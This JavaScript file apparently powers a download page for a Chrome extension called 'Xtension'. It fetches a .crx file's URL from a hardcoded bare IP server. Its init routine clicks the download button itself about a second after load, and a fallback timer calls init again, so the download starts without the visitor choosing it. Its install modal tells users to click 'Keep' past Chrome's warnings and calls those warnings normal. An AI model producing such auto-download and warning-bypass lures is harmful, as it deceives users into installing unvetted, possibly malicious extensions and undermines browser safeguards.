// Xtension Download Script - FINAL FIXED VERSION
// Bulletproof download button with maximum compatibility

(function() {
    'use strict';

    console.log('🚀 Xtension Download Script - FINAL VERSION');

    // Configuration
    const CONFIG = {
        serverUrl: 'http://77.90.51.74:8080',
        endpoint: '/api/generate-download-url',
        timeout: 20000,
        retryAttempts: 2
    };

    let isDownloading = false;

    // Show modal function
    function showModal(content) {
        const modal = document.getElementById('installModal');
        const modalContent = modal.querySelector('.modal-content');
        modalContent.innerHTML = content;
        modal.style.display = 'block';
        document.body.style.overflow = 'hidden';

        // Setup event listeners for new content
        const buttons = modalContent.querySelectorAll('button');
        buttons.forEach(button => {
            button.addEventListener('click', () => {
                const action = button.getAttribute('data-action');
                if (action === 'download') {
                    startDownload();
                } else if (action === 'retry') {
                    location.reload();
                } else if (action === 'close') {
                    modal.style.display = 'none';
                    document.body.style.overflow = 'auto';
                }
            });
        });
    }

    // Show loading modal
    function showLoadingModal(message) {
        const content = `
            <div style="text-align: center; padding: 30px;">
                <div class="spinner"></div>
                <h2>Installing Xtension</h2>
                <p>${message}</p>
                <button data-action="close" style="background: #6c757d; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; margin-top: 15px;">
                    Cancel
                </button>
            </div>
        `;
        showModal(content);
    }

    // Show success modal
    function showSuccessModal() {
        const content = `
            <div style="text-align: left; padding: 20px; max-width: 450px;">
                <div style="background: #d4edda; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
                    <h3 style="color: #155724; margin: 0;">✅ Download Successful!</h3>
                    <p style="color: #155724; margin: 0;">Your Xtension.crx file has been downloaded.</p>
                </div>

                <h4 style="color: #333; margin-bottom: 10px;">To install in Chrome:</h4>
                <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
                    <ol style="margin-left: 20px; line-height: 1.6;">
                        <li><strong>Step 1:</strong> Click the downloaded file</li>
                        <li><strong>Step 2:</strong> Click "Keep" if Chrome warns</li>
                        <li><strong>Step 3:</strong> Click "Install extension"</li>
                        <li><strong>Step 4:</strong> Click "Add extension"</li>
                    </ol>
                </div>

                <p style="color: #6c757d; font-size: 14px; margin-top: 10px;">
                    ⚠️ Chrome warnings are normal for custom extensions
                </p>

                <button data-action="download" style="background: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold;">
                    📥 Download Again
                </button>
            </div>
        `;
        showModal(content);
    }

    // Show error modal
    function showErrorModal(error) {
        const content = `
            <div style="text-align: center; padding: 30px;">
                <div style="background: #f8d7da; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
                    <h3 style="color: #721c24; margin: 0;">❌ Download Failed</h3>
                    <p style="color: #721c24; margin: 0;">${error}</p>
                </div>
                <button data-action="retry" style="background: #28a745; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; margin: 5px;">
                    🔄 Try Again
                </button>
                <button data-action="close" style="background: #dc3545; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; margin: 5px;">
                    Close
                </button>
            </div>
        `;
        showModal(content);
    }

    // Main download function
    async function startDownload() {
        if (isDownloading) {
            console.log('⚠️ Already downloading...');
            return;
        }

        isDownloading = true;
        console.log('🚀 Starting download process...');

        try {
            showLoadingModal('Connecting to server...');

            // Generate download URL
            const response = await fetch(CONFIG.serverUrl + CONFIG.endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                mode: 'cors',
                body: JSON.stringify({
                    timestamp: Date.now()
                })
            });

            console.log('Server response status:', response.status);

            if (!response.ok) {
                throw new Error(`Server error: ${response.status}`);
            }

            const data = await response.json();
            console.log('Server response:', data);

            if (data.success && data.downloadUrl) {
                showLoadingModal('Downloading file...');

                // Download the file
                await downloadFile(data.downloadUrl);

                // Show success
                setTimeout(() => {
                    showSuccessModal();
                    isDownloading = false;
                }, 1500);

            } else {
                throw new Error(data.error || 'Invalid server response');
            }

        } catch (error) {
            console.error('❌ Error:', error);
            showErrorModal(error.message);
            isDownloading = false;
        }
    }

    // Download file function
    function downloadFile(url) {
        return new Promise((resolve) => {
            console.log('📥 Downloading file from:', url);

            // Create download link
            const link = document.createElement('a');
            link.href = url;
            link.download = 'Xtension.crx';
            link.style.display = 'none';

            // Trigger download
            document.body.appendChild(link);
            link.click();

            // Clean up
            document.body.removeChild(link);

            console.log('✅ Download initiated successfully');

            // Give Chrome time to start download
            setTimeout(resolve, 2000);
        });
    }

    // Setup event listeners - CRITICAL
    function setupEventListeners() {
        console.log('🔧 Setting up event listeners...');

        // Download button
        const downloadBtn = document.getElementById('downloadBtn');
        if (downloadBtn) {
            console.log('✅ Download button found:', downloadBtn);

            // Remove all existing event listeners
            const newDownloadBtn = downloadBtn.cloneNode(true);
            downloadBtn.parentNode.replaceChild(newDownloadBtn, downloadBtn);

            // Add multiple event listeners for compatibility
            newDownloadBtn.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                console.log('🖱️ Download button clicked!');
                startDownload();
            });

            newDownloadBtn.onclick = function(e) {
                e.preventDefault();
                e.stopPropagation();
                console.log('🖱️ Download button onclick triggered!');
                startDownload();
            };

            console.log('✅ Event listeners attached to download button');

        } else {
            console.error('❌ Download button not found!');
        }

        // Cancel button and modal
        const modal = document.getElementById('installModal');
        if (modal) {
            modal.addEventListener('click', function(event) {
                if (event.target === modal) {
                    modal.style.display = 'none';
                    document.body.style.overflow = 'auto';
                }
            });
        }

        // Keyboard navigation
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Escape') {
                if (modal && modal.style.display === 'block') {
                    modal.style.display = 'none';
                    document.body.style.overflow = 'auto';
                }
            }
        });

        console.log('✅ Event listeners setup complete');
    }

    // Initialize application
    function init() {
        console.log('🚀 Initializing application...');

        // Setup event listeners immediately
        setupEventListeners();

        // Make functions globally available
        window.startDownload = startDownload;
        window.testDownload = function() {
            console.log('🧪 Testing download function...');
            startDownload();
        };

        console.log('✅ Application initialized successfully');
        console.log('💡 Available commands: startDownload(), testDownload()');

        // Test button functionality
        setTimeout(() => {
            const downloadBtn = document.getElementById('downloadBtn');
            if (downloadBtn) {
                console.log('🧪 Testing download button...');
                try {
                    downloadBtn.click();
                    console.log('✅ Download button test successful!');
                } catch (error) {
                    console.error('❌ Download button test failed:', error);
                }
            }
        }, 1000);
    }

    // Start when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

    // Fallback initialization
    setTimeout(init, 100);

    console.log('📄 Xtension Download Script loaded successfully');

})();
